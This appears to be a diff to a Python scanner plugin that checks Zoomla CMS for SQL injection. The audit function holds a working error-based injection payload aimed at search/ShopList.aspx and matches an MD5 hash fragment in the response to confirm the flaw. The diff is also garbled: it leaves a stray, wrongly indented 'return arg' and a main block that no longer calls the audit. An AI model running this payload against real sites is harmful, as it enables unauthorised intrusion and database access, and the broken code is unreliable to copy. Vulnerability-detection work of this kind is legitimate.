@@ -9,7 +9,6 @@
 def assign(service, arg):
 	if service == 'zoomla':
 		return True, arg
-
 def audit(arg):
 	payload = "search/ShopList.aspx?node=1%20and%021=convert(int,(select%02sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27hentai%27))))&keyword=1"
 	target = arg + payload
@@ -17,6 +16,6 @@ def audit(arg):
 	if '438b1eb36b7e244b' in body:
 		security_hole(target);
 
-if __name__ == '__main__':
-	from dummy import *
-	audit(assign('zoomla', 'http://192.168.0.102/')[1])
+        return arg
+if __name__== '__main__':
+    from dummy import *
